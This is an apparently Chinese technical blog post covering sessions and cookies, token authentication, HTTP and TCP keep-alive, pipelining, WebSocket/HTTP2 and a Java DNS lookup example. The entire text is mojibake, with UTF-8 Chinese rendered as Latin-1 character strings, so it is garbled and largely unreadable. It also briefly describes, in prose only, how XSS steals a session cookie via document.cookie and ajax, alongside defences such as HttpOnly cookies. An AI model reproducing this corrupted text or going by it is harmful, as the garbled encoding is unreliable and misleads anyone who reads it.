Sessionè¶…æ—¶ï¼šè¶…æ—¶æŒ‡çš„æ˜¯è¿ç»­ä¸€å®šæ—¶é—´æœåŠ¡å™¨æ²¡æœ‰æ”¶åˆ°è¯¥Sessionæ‰€å¯¹åº”å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå¹¶ä¸”è¿™ä¸ªæ—¶é—´è¶…è¿‡äº†æœåŠ¡å™¨è®¾ç½®çš„Sessionè¶…æ—¶çš„æœ€å¤§æ—¶é—´ã€‚Sessionçš„maxAgeä¸€èˆ¬ä¸º-1ï¼Œè¡¨ç¤ºä»…å½“å‰æµè§ˆå™¨å†…æœ‰æ•ˆï¼Œå…³é—­æµè§ˆå™¨å°±ä¼šå¤±æ•ˆã€‚ çŸ¥ä¹ä¸Šæœ‰ä¸€æ®µæ¯”è¾ƒå¥½çš„æè¿°,è¿™é‡Œç›´æ¥å¼•ç”¨äº†ã€‚httpæ˜¯æ— çŠ¶æ€çš„åè®®ï¼Œå®¢æˆ·æ¯æ¬¡è¯»å–webé¡µé¢æ—¶ï¼ŒæœåŠ¡å™¨éƒ½æ‰“å¼€æ–°çš„ä¼šè¯ï¼Œè€Œä¸”æœåŠ¡å™¨ä¹Ÿä¸ä¼šè‡ªåŠ¨ç»´æŠ¤å®¢æˆ·çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œé‚£ä¹ˆè¦æ€ä¹ˆæ‰èƒ½å®ç°ç½‘ä¸Šå•†åº—ä¸­çš„è´­ç‰©è½¦å‘¢ï¼Œsessionå°±æ˜¯ä¸€ç§ä¿å­˜ä¸Šä¸‹æ–‡ä¿¡æ¯çš„æœºåˆ¶ï¼Œå®ƒæ˜¯é’ˆå¯¹æ¯ä¸€ä¸ªç”¨æˆ·çš„ï¼Œå˜é‡çš„å€¼ä¿å­˜åœ¨æœåŠ¡å™¨ç«¯ï¼Œé€šè¿‡SessionIDæ¥åŒºåˆ†ä¸åŒçš„å®¢æˆ·,sessionæ˜¯ä»¥cookieæˆ–URLé‡å†™ä¸ºåŸºç¡€çš„ï¼Œé»˜è®¤ä½¿ç”¨cookieæ¥å®ç°ï¼Œç³»ç»Ÿä¼šåˆ›é€ ä¸€ä¸ªåä¸ºJSESSIONIDçš„è¾“å‡ºcookieï¼Œæˆ‘ä»¬å«åšsession cookie,ä»¥åŒºåˆ«persistent cookies,ä¹Ÿå°±æ˜¯æˆ‘ä»¬é€šå¸¸æ‰€è¯´çš„cookie,æ³¨æ„session cookieæ˜¯å­˜å‚¨äºæµè§ˆå™¨å†…å­˜ä¸­çš„ï¼Œå¹¶ä¸æ˜¯å†™åˆ°ç¡¬ç›˜ä¸Šçš„ï¼Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬åˆšæ‰çœ‹åˆ°çš„JSESSIONIDï¼Œæˆ‘ä»¬é€šå¸¸æƒ…æ˜¯çœ‹ä¸åˆ°JSESSIONIDçš„ï¼Œä½†æ˜¯å½“æˆ‘ä»¬æŠŠæµè§ˆå™¨çš„cookieç¦æ­¢åï¼ŒwebæœåŠ¡å™¨ä¼šé‡‡ç”¨URLé‡å†™çš„æ–¹å¼ä¼ é€’Sessionidï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨åœ°å€æ çœ‹åˆ° sessionid=KWJHUG6JJM65HS2K6ä¹‹ç±»çš„å­—ç¬¦ä¸²ã€‚javax.servlet.http.HttpServletRequest.getSession() å°†ä¼šè¿”å›å½“å‰requestç›¸å…³è”çš„HttpSessionå¯¹è±¡ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œå°†ä¼šåˆ›å»ºä¸€ä¸ªã€‚ç¿»è¯‘ä¸€ä¸‹ï¼Œå½“ä¸€ä¸ªæµè§ˆå™¨è¯·æ±‚æ¥åˆ°ä¹‹åï¼ŒServletå¤„ç†ç¨‹åºï¼ˆServletå®¹å™¨å†…éƒ¨å®ç°ï¼‰å°†ä¼šä¸»åŠ¨æ£€æŸ¥è¯·æ±‚ä¿¡æ¯Cookieå½“ä¸­æ˜¯å¦æœ‰JSESSIONIDï¼Œè‹¥æœ‰ï¼Œæ‰¾åˆ°å¯¹åº”JSESSIONçš„HttpSessionå¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ›å»ºä¸€ä¸ªï¼Œå…·ä½“çš„æœºåˆ¶åœ¨Servletå®¹å™¨çš„å®ç°å½“ä¸­ã€‚ Sessionå°±æ˜¯ç»´æŠ¤ä¼šè¯çš„ã€‚ å› ä¸ºsessionidä¸€èˆ¬æ˜¯ä¿å­˜åœ¨cookieé‡Œé¢çš„ï¼Œè€Œä¸”å¯¹åº”çš„cookieçš„keyå¤šåŠæ˜¯session_idè¿™æ ·ï¼ˆç™¾åº¦é¦–é¡µçš„å«åšBIDUPSIDï¼‰ï¼Œè¿™å°±å‡ºç°äº†å¾ˆå¤šä»cookieé‡Œé¢æ‹¿session_idå»ä¼ªé€ èº«ä»½çš„xssåŠ«æŒsessionã€‚ï¼ˆå…¶å®åšæ³•å¾ˆç®€å•ï¼šå°±æ˜¯ä¸€æ®µjså»æ‹¿document.cookieï¼Œç„¶åajaxå·å·ä¸Šä¼ è¿™ä¸ªsession_idï¼‰ï¼šé˜²èŒƒçš„æ‰‹æ®µä¹Ÿå¾ˆå¸¸è§äº†ï¼š1.è¿‡æ»¤ç”¨æˆ·è¾“å…¥ï¼Œé˜²æ­¢xssæ¼æ´2.è®¾ç½®session_idè¿™ä¸ªcookieä¸ºhttp_only sessionåœ¨express jsä¸­æ˜¯è¿™ä¹ˆç»´æŠ¤çš„ è¿™æ„æ€å°±æ˜¯è¯´ï¼Œå½“ä½ æµè§ˆä¸€ä¸ªç½‘é¡µæ—¶ï¼ŒæœåŠ¡ç«¯éšæœºäº§ç”Ÿä¸€ä¸ª 1024 æ¯”ç‰¹é•¿çš„å­—ç¬¦ä¸²ï¼Œç„¶åå­˜åœ¨ä½  cookie ä¸­çš„ connect.sid å­—æ®µä¸­ã€‚å½“ä½ ä¸‹æ¬¡è®¿é—®æ—¶ï¼Œcookie ä¼šå¸¦æœ‰è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åæµè§ˆå™¨å°±çŸ¥é“ä½ æ˜¯ä¸Šæ¬¡è®¿é—®è¿‡çš„æŸæŸæŸï¼Œç„¶åä»æœåŠ¡å™¨çš„å­˜å‚¨ä¸­å–å‡ºä¸Šæ¬¡è®°å½•åœ¨ä½ èº«ä¸Šçš„æ•°æ®ã€‚ç”±äºå­—ç¬¦ä¸²æ˜¯éšæœºäº§ç”Ÿçš„ï¼Œè€Œä¸”ä½æ•°è¶³å¤Ÿå¤šï¼Œæ‰€ä»¥ä¹Ÿä¸æ‹…å¿ƒæœ‰äººèƒ½å¤Ÿä¼ªé€ ã€‚ä¼ªé€ æˆåŠŸçš„æ¦‚ç‡æ¯”ååœ¨å®¶é‡Œç¼–ç¨‹æ—¶è¢«é‚»å±…å®¶çš„ç‹—çªç„¶é—¯å…¥å¹¶å’¬æ­»çš„å‡ ç‡è¿˜ä½ã€‚ 4.3 è‡ªåŠ¨ç™»å½•çš„å®ç°ä¸€äº›ç½‘ç«™çš„â€œè®°ä½å¯†ç ï¼Œè‡ªåŠ¨ç™»å½•åŠŸèƒ½â€ï¼Œæ®è¯´discuzç›´æ¥å°†åŠ å¯†çš„ï¼ˆå¯é€†ï¼‰uidå’Œå¯†ç ä¿å­˜åˆ°cookieä¸­ã€‚å¦å¤–ä¸€ç§åšæ³•æ˜¯å¯ä»¥å°è¯•å°†Sessionçš„è¿‡æœŸæ—¶é—´è®¾ç½®çš„é•¿ä¸€ç‚¹ï¼Œæ¯”å¦‚ä¸€å¹´ï¼Œä¸‹æ¬¡è®¿é—®ç½‘ç«™çš„æ—¶å€™å°±èƒ½å®ç°è‡ªåŠ¨ç™»å½•äº†ã€‚æ›´å¥½ä¸€ç‚¹çš„æ˜¯æ˜¯æœ¬åœ°ç»ä¸ä¿å­˜ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ï¼Œç™»å½•ç”Ÿæˆä¸€ä¸ªæœ‰è¿‡æœŸæ—¶é—´çš„çš„cookieæˆ–è€…tokenè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œä¸‹æ¬¡æ‰“å¼€æµè§ˆå™¨åˆ¤æ–­ä¸‹è¿‡æœŸæ—¶é—´å°±å¥½äº†ã€‚å¦å¤–ï¼Œç°åœ¨æµè§ˆå™¨å¤§å¤šå¸¦æœ‰è®°ä½å¯†ç çš„åŠŸèƒ½ï¼Œè¿™ä¸ªé”…è¿˜æ˜¯ä¸¢ç»™æµè§ˆå™¨(ç”¨æˆ·)å¥½äº†ã€‚ å…³äºTokendjango jwtç›´æ¥æŠŠtokenæ”¾åœ¨headeré‡Œã€‚å…¶å®tokenä¹Ÿå°±æ˜¯æ”¾åœ¨headerä¸­çš„ä¸€ä¸ªkey-value GET /polls/api/questions/1 HTTP/1.1 Host: localhost:8000 Content-Type: application/json Authorization: Token 93138ba960dfb4ef2eef6b907718ae04400f606a Cache-Control: no-cache Postman-Token: ddc99b57-f703-4d05-abbe-c0123d4f5fed æ³¨æ„è¿™ä¸ªAuthorization,åé¢çš„valueæ˜¯TokenåŠ ä¸Šä¸€ä¸ªç©ºæ ¼ å†åŠ ä¸Šä¸€é•¿æ®µåŠ å¯†å­—ç¬¦ä¸²ã€‚æ¯ä¸€æ¬¡è¯·æ±‚éœ€è¦è®¤è¯çš„æ¥å£éƒ½å¾—æŠŠè¿™ä¸ªtokenå¸¦ä¸Šã€‚æ‰€ä»¥åœ¨postmané‡Œé¢è°ƒè¯•çš„è¯ï¼Œæ¯æ¬¡è¯·æ±‚éƒ½å¾—æ‰‹åŠ¨åŠ ä¸Šè¿™æ ·ä¸€ä¸ªHEADERã€‚postmané‡Œé¢æœ‰authenticationçš„é€‰é¡¹ï¼Œä½†å¥½åƒéƒ½ä¸æ˜¯è¿™ç§ï¼ˆç›®æµ‹bearerTokenæœ‰ç‚¹åƒï¼‰ã€‚æ‰€ä»¥å¾—æ‰‹åŠ¨åŠ ä¸Šã€‚ è®ºTokenä¸ºä»€ä¹ˆè¦æ”¾åœ¨å†…å­˜é‡Œ ä¸ºäº†è§£å†³åœ¨æ“ä½œè¿‡ç¨‹ä¸èƒ½è®©ç”¨æˆ·æ„Ÿåˆ° Token å¤±æ•ˆè¿™ä¸ªé—®é¢˜ï¼Œæœ‰ä¸€ç§æ–¹æ¡ˆæ˜¯åœ¨æœåŠ¡å™¨ç«¯ä¿å­˜ Token çŠ¶æ€ï¼Œç”¨æˆ·æ¯æ¬¡æ“ä½œéƒ½ä¼šè‡ªåŠ¨åˆ·æ–°ï¼ˆæ¨è¿Ÿï¼‰ Token çš„è¿‡æœŸæ—¶é—´â€”â€”Session å°±æ˜¯é‡‡ç”¨è¿™ç§ç­–ç•¥æ¥ä¿æŒç”¨æˆ·ç™»å½•çŠ¶æ€çš„ã€‚ç„¶è€Œä»ç„¶å­˜åœ¨è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨å‰åç«¯åˆ†ç¦»ã€å•é¡µ App è¿™äº›æƒ…å†µä¸‹ï¼Œæ¯ç§’ç§å¯èƒ½å‘èµ·å¾ˆå¤šæ¬¡è¯·æ±‚ï¼Œæ¯æ¬¡éƒ½å»åˆ·æ–°è¿‡æœŸæ—¶é—´ä¼šäº§ç”Ÿéå¸¸å¤§çš„ä»£ä»·ã€‚å¦‚æœ Token çš„è¿‡æœŸæ—¶é—´è¢«æŒä¹…åŒ–åˆ°æ•°æ®åº“æˆ–æ–‡ä»¶ï¼Œä»£ä»·å°±æ›´å¤§äº†ã€‚æ‰€ä»¥é€šå¸¸ä¸ºäº†æå‡æ•ˆç‡ï¼Œå‡å°‘æ¶ˆè€—ï¼Œä¼šæŠŠ Token çš„è¿‡æœŸæ—¶ä¿å­˜åœ¨ç¼“å­˜æˆ–è€…å†…å­˜ä¸­ã€‚ è¿™ç¯‡æ–‡ç« é¡ºä¾¿æåˆ°äº†å¦‚æœåœ¨Tokenè¿‡æœŸçš„æ—¶å€™å»å®ç°é‡åˆ·Tokençš„æ“ä½œï¼Œé¦–å…ˆå®¢æˆ·ç«¯ç»å¯¹ä¸ä¼šå­˜è´¦æˆ·å¯†ç è¿™ç§æ•æ„Ÿä¿¡æ¯ã€‚ç¬¬ä¸€æ¬¡ç™»å½•æˆåŠŸåï¼Œåå°è¿”å›token(æœ‰ä¸€å®šæ—¶é•¿æœ‰æ•ˆæœŸ)å’Œä¸€ä¸ªrefreshToken(å¦‚æœå‰é¢çš„tokenå¤±æ•ˆäº†ï¼Œç›´æ¥æ‹¿ç€è¿™ä¸ªå»è¯·æ±‚åå°ç»™ä¸ªæ–°çš„Token)ã€‚æ‰€ä»¥å®¢æˆ·ç«¯åŸºæœ¬ä¸Šå°±æ˜¯åœ¨onErroré‡Œé¢åˆ¤æ–­å¦‚æœæ˜¯Tokenå¤±æ•ˆçš„è¯ï¼Œæ‹¿ç€refreshTokenå»é‡æ–°è·å–Tokenã€‚ tokençš„è¯ï¼Œä¸€èˆ¬æ˜¯å’Œç”¨æˆ·ä¸€ä¸€å¯¹åº”çš„ï¼Œ æ”¾åœ¨httpçš„headeré‡Œä¹Ÿè¡Œï¼Œæ”¾åœ¨cookieé‡Œé¢ä¹Ÿè¡Œï¼ˆä¸å¤§å¥½ï¼ŒCSRFæ¼æ´ï¼‰ï¼Œæ”¾åœ¨postè¯·æ±‚çš„bodyé‡Œé¢ä¹Ÿè¡Œã€‚ sessionå’Œç®€å•çš„tokenæœ¬è´¨ä¸Šéƒ½æ˜¯ä¸€ä¸²åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œåªä¸è¿‡sessionä¸€èˆ¬æ”¾cookieé‡Œé¢ï¼Œæµè§ˆå™¨å¯¹è¿™ä¸ªæ”¯æŒæ¯”è¾ƒå¥½ï¼Œandroidå’Œiosä¸€èˆ¬ä¸ä¼šä¸€ç›´ç»´æŠ¤ä¸€ä¸ªwebviewä¸“é—¨ç”¨æ¥å­˜session_idï¼Œæ‰€ä»¥ç”¨tokenæ¯”è¾ƒåˆé€‚ã€‚v2ä¸Šæœ‰äººè®¨è®ºsessionå’Œtokençš„åŒºåˆ«ã€‚ä½†è¦æ˜¯è¯´oAuth Tokenï¼Œè¿™è¿˜æ˜¯æ¯”sessionå¤æ‚å¾—å¤šçš„ã€‚ 5. é•¿è¿æ¥åƒå³æ—¶é€šè®¯è½¯ä»¶ï¼Œæˆ–è€…æ¶ˆæ¯æ¨é€è¿™ç§åœºæ™¯ï¼Œéƒ½å¾—ç»´æŠ¤ä¸€ä¸ªé•¿è¿æ¥ã€‚HTTPé•¿è¿æ¥å’ŒçŸ­è¿æ¥HTTPé‚£ä¸ªé•¿è¿æ¥æ›´å¤šçš„æ—¶å€™è¢«å«åšâ€œæŒä¹…è¿æ¥â€tcp é•¿è¿æ¥ çš„æ—¶é—´é»˜è®¤æ˜¯2å°æ—¶ ï¼š /proc/sys/net/ipv4/tcp_keepalive_time 7200 5.1é•¿è¿æ¥çš„å®ç°åŸç† è½®è¯¢ ç»´æŠ¤é•¿è¿æ¥çš„å¿ƒè·³(å¿ƒè·³çš„ç›®çš„å¾ˆç®€å•ï¼šé€šè¿‡å®šæœŸçš„æ•°æ®åŒ…ï¼Œå¯¹æŠ—NATè¶…æ—¶) Tcpé•¿è¿æ¥ HTTP1.1è§„å®šäº†é»˜è®¤ä¿æŒé•¿è¿æ¥ï¼ˆHTTP persistent connection ï¼Œä¹Ÿæœ‰ç¿»è¯‘ä¸ºæŒä¹…è¿æ¥ï¼‰ï¼Œæ•°æ®ä¼ è¾“å®Œæˆäº†ä¿æŒTCPè¿æ¥ä¸æ–­å¼€ï¼ˆä¸å‘RSTåŒ…ã€ä¸å››æ¬¡æ¡æ‰‹ï¼‰ï¼Œç­‰å¾…åœ¨åŒåŸŸåä¸‹ç»§ç»­ç”¨è¿™ä¸ªé€šé“ä¼ è¾“æ•°æ®ï¼›ç›¸åçš„å°±æ˜¯çŸ­è¿æ¥ã€‚TCPçš„keep aliveæ˜¯æ£€æŸ¥å½“å‰TCPè¿æ¥æ˜¯å¦æ´»ç€ï¼›HTTPçš„Keep-aliveæ˜¯è¦è®©ä¸€ä¸ªTCPè¿æ¥æ´»ä¹…ç‚¹ã€‚å®ƒä»¬æ˜¯ä¸åŒå±‚æ¬¡çš„æ¦‚å¿µã€‚TCP keep aliveçš„è¡¨ç°ï¼šå½“ä¸€ä¸ªè¿æ¥â€œä¸€æ®µæ—¶é—´â€æ²¡æœ‰æ•°æ®é€šè®¯æ—¶ï¼Œä¸€æ–¹ä¼šå‘å‡ºä¸€ä¸ªå¿ƒè·³åŒ…ï¼ˆKeep AliveåŒ…ï¼‰ï¼Œå¦‚æœå¯¹æ–¹æœ‰å›åŒ…åˆ™è¡¨æ˜å½“å‰è¿æ¥æœ‰æ•ˆï¼Œç»§ç»­ç›‘æ§ã€‚Httpé•¿è¿æ¥ä¸å¦‚è¯´tcpé•¿è¿æ¥,Tcpæ˜¯å¯ä»¥ä¸æ–­å¼€çš„ï¼Œhttpè¿æ¥æœåŠ¡å™¨ç»™åˆ°responseä¹‹åå°±æ–­å¼€äº†ã€‚TCPè¿æ¥Httpä¸è¿‡æ˜¯åšäº†tcpè¿æ¥å¤ç”¨,httpé€šé“æ˜¯ä¸€æ¬¡æ€§çš„ï¼Œtcpä¸æ˜¯çš„ï¼Œè¿™æ ·åšä¹Ÿæ˜¯ä¸ºäº†èŠ‚çœtcpé€šé“ã€‚é•¿è¿æ¥å°±æ˜¯Connection keep-Aliveé‚£ç©æ„ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½å¾—è®¾ç½®æ‰æœ‰æ•ˆã€‚é•¿çŸ­è½®è¯¢çš„é—´éš”æ˜¯æœåŠ¡å™¨é€šè¿‡ä»£ç æ§åˆ¶çš„ã€‚ TCP é•¿è¿æ¥æ˜¯ä¸€ç§ä¿æŒ TCP è¿æ¥çš„æœºåˆ¶ã€‚å½“ä¸€ä¸ª TCP è¿æ¥å»ºç«‹ä¹‹åï¼Œå¯ç”¨ TCP Keep Alive çš„ä¸€ç«¯ä¾¿ä¼šå¯åŠ¨ä¸€ä¸ªè®¡æ—¶å™¨ï¼Œå½“è¿™ä¸ªè®¡æ—¶å™¨åˆ°è¾¾ 0 ä¹‹åï¼Œä¸€ä¸ª TCP æ¢æµ‹åŒ…ä¾¿ä¼šè¢«å‘å‡ºã€‚è¿™ä¸ª TCP æ¢æµ‹åŒ…æ˜¯ä¸€ä¸ªçº¯ ACK åŒ…ï¼Œä½†æ˜¯å…¶ Seq ä¸ä¸Šä¸€ä¸ªåŒ…æ˜¯é‡å¤çš„ã€‚æ‰“ä¸ªæ¯”å–»ï¼ŒTCP Keep Alive æ˜¯è¿™æ ·çš„ï¼šTCP è¿æ¥ä¸¤ç«¯å¥½æ¯”ä¸¤ä¸ªäººï¼Œè¿™ä¸¤ä¸ªäººä¹‹é—´ä¿æŒé€šä¿¡å¾€æ¥ï¼ˆå»ºç«‹ TCP è¿æ¥ï¼‰ã€‚å¦‚æœä»–ä¿©ç»å¸¸é€šä¿¡ï¼ˆç»å¸¸å‘é€ TCP æ•°æ®ï¼‰ï¼Œé‚£è¿™ä¸ª TCP è¿æ¥è‡ªç„¶æ˜¯å»ºç«‹ç€çš„ã€‚ä½†å¦‚æœä¸¤äººåªæ˜¯å¶å°”é€šä¿¡ã€‚é‚£ä¹ˆï¼Œå…¶ä¸­ä¸€ä¸ªäººï¼ˆæˆ–ä¸¤äººåŒæ—¶ï¼‰æƒ³çŸ¥é“å¯¹æ–¹æ˜¯å¦è¿˜åœ¨ï¼Œå°±ä¼šå®šæœŸå‘é€ä¸€ä»½é‚®ä»¶ï¼ˆKeep Alive æ¢æµ‹åŒ…ï¼‰ï¼Œè¿™ä¸ªé‚®ä»¶æ²¡æœ‰å®è´¨å†…å®¹ï¼Œåªæ˜¯é—®å¯¹æ–¹æ˜¯å¦è¿˜åœ¨ï¼Œå¦‚æœå¯¹æ–¹æ”¶åˆ°ï¼Œå°±ä¼šå›å¤è¯´è¿˜åœ¨ï¼ˆå¯¹è¿™ä¸ªæ¢æµ‹åŒ…çš„ ACK å›åº”ï¼‰ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œkeep alive æŠ€æœ¯åªæ˜¯ TCP æŠ€æœ¯ä¸­çš„ä¸€ä¸ªå¯é€‰é¡¹ã€‚å› ä¸ºä¸å½“çš„é…ç½®å¯èƒ½ä¼šå¼•èµ·è¯¸å¦‚ä¸€ä¸ªæ­£åœ¨è¢«ä½¿ç”¨çš„ TCP è¿æ¥è¢«æå‰å…³é—­è¿™æ ·çš„é—®é¢˜ï¼Œæ‰€ä»¥é»˜è®¤æ˜¯å…³é—­çš„ çŸ­è¿æ¥ï¼š æ¯ä¸ªè¿æ¥çš„å»ºç«‹éƒ½æ˜¯éœ€è¦èµ„æºæ¶ˆè€—å’Œæ—¶é—´æ¶ˆè€—.çŸ­è¿æ¥éƒ½æ˜¯è¿æ¥å»ºç«‹åï¼Œclientå‘serverå‘é€æ¶ˆæ¯ï¼Œserverå›åº”clientï¼Œä¸€æ¬¡è¯»å†™å®Œæˆã€‚è¿æ¥çš„ä»»æ„ä¸€æ–¹éƒ½å¯ä»¥å…³é—­è¿æ¥ï¼Œä¸€èˆ¬æ˜¯clientä¸»åŠ¨å…³é—­ã€‚å‰ç«¯ç½‘é¡µä¸€èˆ¬ç”¨çŸ­è¿æ¥ï¼Œä¸€ä¸ªç½‘é¡µä¼šå‘å¾ˆå¤šè¯·æ±‚ï¼Œå¦‚æœè¿™äº›å…¨éƒ¨ä½œä¸ºé•¿è¿æ¥ä¿ç•™ä¸‹æ¥ï¼ŒæœåŠ¡å™¨æ‰›ä¸ä½ã€‚è¿™ä¹Ÿå°±çªå‡ºäº†çŸ­è¿æ¥çš„å¥½å¤„ï¼Œç®¡ç†æ–¹ä¾¿ã€‚ é•¿è¿æ¥ï¼šåŒºåˆ«äºçŸ­è¿æ¥çš„æ˜¯ï¼Œå®Œæˆä¸€æ¬¡è¯»å†™åï¼Œåç»­çš„è¯»å†™æ“ä½œéƒ½ç»§ç»­ä½¿ç”¨è¿™ä¸ªè¿æ¥ã€‚å­˜åœ¨çš„é—®é¢˜æ˜¯ï¼Œå¦‚æœä¸€ç›´ä¿æŒç€è¿æ¥ï¼ŒæœåŠ¡å™¨å¯èƒ½è¢«æ‹–å®ï¼Œè¿™æ—¶å€™å¯ä»¥é™åˆ¶å•ç”¨æˆ·çš„æœ€å¤§è¿æ¥æ•°ã€‚é•¿è¿æ¥ä¸€èˆ¬ç”¨äºæ“ä½œé¢‘ç¹ï¼Œç‚¹å¯¹ç‚¹çš„é€šè®¯ï¼Œä¸”è¿æ¥æ•°ä¸èƒ½å¤ªå¤šçš„æƒ…å†µã€‚å› ä¸ºæ²¡æœ‰äº†è€—æ—¶çš„ä¸‰æ¬¡æ¡æ‰‹åŠæ–­å¼€ï¼Œé€‚ç”¨äºæ¯”è¾ƒåŠæ—¶çš„åº”ç”¨åœºæ™¯ã€‚ä¾‹å¦‚ï¼Œä¸æ•°æ®åº“çš„è¿æ¥ç”¨é•¿è¿æ¥ï¼ŒçŸ­è¿æ¥é¢‘ç¹çš„æ“ä½œä¼šé€ æˆSocketé”™è¯¯ï¼Œå¹¶ä¸”é¢‘ç¹çš„Socketåˆ›å»ºä¹Ÿæ˜¯å¯¹æ“ä½œç³»ç»Ÿèµ„æºçš„æµªè´¹ã€‚ 5.2 keep-Aliveå’ŒWebSocketçš„åŒºåˆ« 5.3 http2å¯ä»¥å®ç°æ¨é€äº†5.4 Httpè¿™ç©æ„å°±ä¸æ˜¯ä¸ºäº†è§†é¢‘æµè®¾è®¡çš„HTTP wasnâ€™t really designed for streaming 5.5 ä¸»æµæµè§ˆå™¨æµè§ˆå™¨é»˜è®¤æœ€å¤§å¹¶å‘è¿æ¥æ•°æµè§ˆå™¨ä¸å¯èƒ½åŒæ—¶å‘èµ·10000ä¸ªè¯·æ±‚ï¼Œæ‰€ä»¥ä¸»æµæµè§ˆå™¨éƒ½è®¾å®šäº†é™åˆ¶,ä¸»è¦æ˜¯http1.1,http2çš„è¯ï¼Œåªæœ‰ä¸€æ¡connectionã€‚è§£é‡Š 5.6 TLS,SSLhttps = Hyper Text Transfer Protocol over Secure Socket Layer ã€‚æ˜¯ä»¥å®‰å…¨ä¸ºç›®æ ‡çš„httpé€šé“ï¼Œç®€å•è®²æ˜¯HTTPçš„å®‰å…¨åŠï¼Œå³httpä¸‹å‡å¦‚SSLå±‚ï¼ŒHTTPSå®‰å…¨çš„åŸºç¡€æ˜¯SSLã€‚httpsæ˜¯å¯èƒ½è¢«åŠ«æŒçš„ï¼Œåªè¦å¯¼å…¥äº†ä¸€ä¸ªä¸çŸ¥åçš„æ ¹è¯ä¹¦ 5.7 ä»€ä¹ˆå« Pipeline ç®¡çº¿åŒ– HTTP1.0 ä¸æ”¯æŒç®¡çº¿åŒ–ï¼ŒåŒä¸€ä¸ªè¿æ¥å¤„ç†è¯·æ±‚çš„é¡ºåºæ˜¯é€ä¸ªåº”ç­”æ¨¡å¼ï¼Œå¤„ç†ä¸€ä¸ªè¯·æ±‚å°±éœ€è¦è€—è´¹ä¸€ä¸ª TTLï¼Œä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨çš„å¾€è¿”æ—¶é—´ï¼Œå¤„ç† N ä¸ªè¯·æ±‚å°±æ˜¯ N ä¸ª TTL æ—¶é•¿ã€‚å½“é¡µé¢çš„è¯·æ±‚éå¸¸å¤šæ—¶ï¼Œé¡µé¢åŠ è½½é€Ÿåº¦å°±ä¼šéå¸¸ç¼“æ…¢ã€‚ ä» HTTP1.1 å¼€å§‹è¦æ±‚æœåŠ¡å™¨æ”¯æŒç®¡çº¿åŒ–ï¼Œå¯ä»¥åŒæ—¶å°†å¤šä¸ªè¯·æ±‚å‘é€åˆ°æœåŠ¡å™¨ï¼Œç„¶åé€ä¸ªè¯»å–å“åº”ã€‚è¿™ä¸ªç®¡çº¿åŒ–å’Œ Redis çš„ç®¡çº¿åŒ–åŸç†æ˜¯ä¸€æ ·çš„ï¼Œå“åº”çš„é¡ºåºå¿…é¡»å’Œè¯·æ±‚çš„é¡ºåºä¿æŒä¸€è‡´ã€‚ 6. WebSocketã€SPDYã€Http2WebSocketä¸€ç§åœ¨å•ä¸ªTCP è¿æ¥ä¸Šè¿›è¡Œå…¨åŒå·¥é€šè®¯çš„åè®®ã€‚(æ³¨æ„ï¼Œtcpå»ºç«‹è¿æ¥åï¼ŒTCPåè®®æä¾›å…¨åŒå·¥çš„é€šä¿¡æœåŠ¡ï¼Œä½†æ˜¯ä¸€èˆ¬çš„å®¢æˆ·ç«¯/æœåŠ¡å™¨ç¨‹åºçš„æµç¨‹æ˜¯ç”±å®¢æˆ·ç«¯ä¸»åŠ¨å‘èµ·è¯·æ±‚ï¼ŒæœåŠ¡å™¨è¢«åŠ¨å¤„ç†è¯·æ±‚ï¼Œä¸€é—®ä¸€ç­”çš„æ–¹å¼ã€‚tcpè¿™ä¸€å±‚æ˜¯å®Œå…¨æ”¯æŒæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯åŒæ—¶è¯´è¯çš„ï¼Œåªæ˜¯åº”ç”¨å¼€å‘ä¹ æƒ¯äº†è¿™ç§ä¸€é—®ä¸€ç­”çš„æ–¹å¼) HTTP/2ï¼ˆè¶…æ–‡æœ¬ä¼ è¾“åè®®ç¬¬2ç‰ˆï¼Œæœ€åˆå‘½åä¸ºHTTP 2.0ï¼‰ï¼Œç®€ç§°ä¸ºh2ï¼ˆåŸºäºTLS/1.2æˆ–ä»¥ä¸Šç‰ˆæœ¬çš„åŠ å¯†è¿æ¥ï¼‰æˆ–h2cï¼ˆéåŠ å¯†è¿æ¥ï¼‰ï¼Œæ˜¯HTTPåè®®çš„çš„ç¬¬äºŒä¸ªä¸»è¦ç‰ˆæœ¬SPDYä¹Ÿå°±æ˜¯HTTP/2çš„å‰èº«ï¼Œä¸€ç§å¼€æ”¾çš„ç½‘ç»œä¼ è¾“åè®®ï¼Œç”±Googleå¼€å‘ï¼Œç”¨æ¥å‘é€ç½‘é¡µå†…å®¹ã€‚åŸºäºä¼ è¾“æ§åˆ¶åè®®ï¼ˆTCPï¼‰çš„åº”ç”¨å±‚åè®® 7. DNS(domain Name System)é€šè¿‡javaä»£ç è°ƒç”¨DNSçš„æ–¹å¼ public class Test { public static void main(String[] args) throws UnknownHostException { //è·å–æœ¬æœºIPåœ°å€ System.out.println(InetAddress.getLocalHost().getHostAddress()); //è·å–www.baidu.comçš„åœ°å€ System.out.println(InetAddress.getByName(&quot;www.baidu.com&quot;)); //è·å–www.baidu.comçš„çœŸå®IPåœ°å€ System.out.println(InetAddress.getByName(&quot;www.baidu.com&quot;).getHostAddress()); //è·å–é…ç½®åœ¨HOSTä¸­çš„åŸŸåIPåœ°å€ System.out.println(InetAddress.getByName(&quot;TEST&quot;).getHostAddress()); } } è¿è¥å•†åŠ«æŒæœ‰ä¸¤ç§ï¼šDNSåŠ«æŒ(è¿™ä¸ªéƒ½æ‡‚)å’Œæ•°æ®åŠ«æŒ(åœ¨è¿”å›çš„å†…å®¹ä¸­å¼ºè¡Œæ’å…¥å¹¿å‘Šç­‰å…¶ä»–å†…å®¹ï¼Œè¿™ç§ä¸€èˆ¬æ˜¯å¯¹httpä¸‹æ‰‹)ã€‚ 